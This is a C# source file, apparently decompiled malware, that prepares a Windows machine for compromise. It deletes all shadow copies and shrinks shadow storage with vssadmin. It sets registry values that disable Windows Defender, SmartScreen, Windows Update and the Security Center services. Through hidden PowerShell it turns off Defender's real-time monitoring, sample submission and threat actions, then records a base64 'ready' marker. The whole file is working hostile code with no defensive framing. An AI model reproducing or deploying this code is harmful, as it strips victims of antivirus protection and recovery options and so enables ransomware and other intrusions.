using System;
using System.Diagnostics;
using Client.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns14;

namespace ns0;

public class GClass0
{
	public static void smethod_0()
	{
		if (Class0.smethod_2() && Operators.CompareString(Class0.smethod_6("Property"), (string)null, false) == 0)
		{
			smethod_4();
			smethod_2();
			smethod_1();
			Class0.smethod_9("Property", "U3VjY2Vzc2Z1bGx5IFJlYWR5IQ==");
		}
	}

	private static void smethod_1()
	{
		try
		{
			Interaction.Shell("cmd /c vssadmin Delete Shadows /all /quiet", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadow /for=c: /on=c: /maxsize=401MB", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded", (AppWinStyle)0, false, -1);
			Interaction.Shell("cmd /c Vssadmin delete shadowstorage /all /quiet", (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_2()
	{
		try
		{
			smethod_3("Software\\Microsoft\\Edge\\SmartScreenEnabled", "SmartScreenEnabled", "0");
			smethod_3("Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "ScheduledInstallTime", "1");
			smethod_3("Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "ScheduledInstallDay", "1");
			smethod_3("Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "AUOptions", "1");
			smethod_3("Software\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU", "NoAutoUpdate", "1");
			smethod_3("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
			smethod_3("SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting", "Disabled", "1");
			smethod_3("SYSTEM\\CurrentControlSet\\Services\\wscsvc", "Start", "00000004");
			smethod_3("SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService", "Start", "00000004");
			smethod_3("SOFTWARE\\Policies\\Microsoft\\Windows\\System", "ConfigureAppInstallControlEnabled", "00000001");
			smethod_3("SOFTWARE\\Policies\\Microsoft\\Windows\\System", "ConfigureAppInstallControl", "Anywhere");
			smethod_3("SOFTWARE\\Policies\\Microsoft\\Windows\\System", "EnableSmartScreen", "00000000");
			smethod_3("SOFTWARE\\Policies\\Microsoft\\MicrosoftEdge\\PhishingFilter", "EnabledV9", "00000000");
			smethod_3("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer", "SmartScreenEnabled", "0");
			smethod_3("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
			smethod_3("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
			smethod_3("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
			smethod_3("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
			((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\AppHost", "EnableWebContentEvaluation", (object)"00000000", RegistryValueKind.DWord);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_3(string string_0, string string_1, string string_2)
	{
		try
		{
			using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_0, RegistryKeyPermissionCheck.ReadWriteSubTree);
			if (registryKey == null)
			{
				Registry.LocalMachine.CreateSubKey(string_0).SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
			else if (registryKey.GetValue(string_1) != string_2)
			{
				registryKey.SetValue(string_1, string_2, RegistryValueKind.DWord);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_4()
	{
		try
		{
			Process process = new Process
			{
				StartInfo = new ProcessStartInfo
				{
					FileName = "powershell",
					Arguments = "Get-MpPreference -verbose",
					UseShellExecute = false,
					RedirectStandardOutput = true,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true
				}
			};
			process.Start();
			while (!process.StandardOutput.EndOfStream)
			{
				string text = process.StandardOutput.ReadLine();
				if (text.Contains("DisableRealtimeMonitoring") && text.Contains("False"))
				{
					smethod_5("Set-MpPreference -DisableRealtimeMonitoring $true");
				}
				else if (text.Contains("DisableBehaviorMonitoring") && text.Contains("False"))
				{
					smethod_5("Set-MpPreference -DisableBehaviorMonitoring $true");
				}
				else if (text.Contains("DisableBlockAtFirstSeen") && text.Contains("False"))
				{
					smethod_5("Set-MpPreference -DisableBlockAtFirstSeen $true");
				}
				else if (text.Contains("DisableIOAVProtection") && text.Contains("False"))
				{
					smethod_5("Set-MpPreference -DisableIOAVProtection $true");
				}
				else if (text.Contains("DisablePrivacyMode") && text.Contains("False"))
				{
					smethod_5("Set-MpPreference -DisablePrivacyMode $true");
				}
				else if (text.Contains("SignatureDisableUpdateOnStartupWithoutEngine") && text.Contains("False"))
				{
					smethod_5("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
				}
				else if (text.Contains("DisableArchiveScanning") && text.Contains("False"))
				{
					smethod_5("Set-MpPreference -DisableArchiveScanning $true");
				}
				else if (text.Contains("DisableIntrusionPreventionSystem") && text.Contains("False"))
				{
					smethod_5("Set-MpPreference -DisableIntrusionPreventionSystem $true");
				}
				else if (text.Contains("DisableScriptScanning") && text.Contains("False"))
				{
					smethod_5("Set-MpPreference -DisableScriptScanning $true");
				}
				else if (text.Contains("SubmitSamplesConsent") && !text.Contains("2"))
				{
					smethod_5("Set-MpPreference -SubmitSamplesConsent 2");
				}
				else if (text.Contains("MAPSReporting") && !text.Contains("0"))
				{
					smethod_5("Set-MpPreference -MAPSReporting 0");
				}
				else if (text.Contains("HighThreatDefaultAction") && !text.Contains("6"))
				{
					smethod_5("Set-MpPreference -HighThreatDefaultAction 6 -Force");
				}
				else if (text.Contains("ModerateThreatDefaultAction") && !text.Contains("6"))
				{
					smethod_5("Set-MpPreference -ModerateThreatDefaultAction 6");
				}
				else if (text.Contains("LowThreatDefaultAction") && !text.Contains("6"))
				{
					smethod_5("Set-MpPreference -LowThreatDefaultAction 6");
				}
				else if (text.Contains("SevereThreatDefaultAction") && !text.Contains("6"))
				{
					smethod_5("Set-MpPreference -SevereThreatDefaultAction 6");
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_5(string string_0)
	{
		Process process = new Process
		{
			StartInfo = new ProcessStartInfo
			{
				FileName = "powershell",
				Arguments = string_0,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true
			}
		};
		process.Start();
	}
}
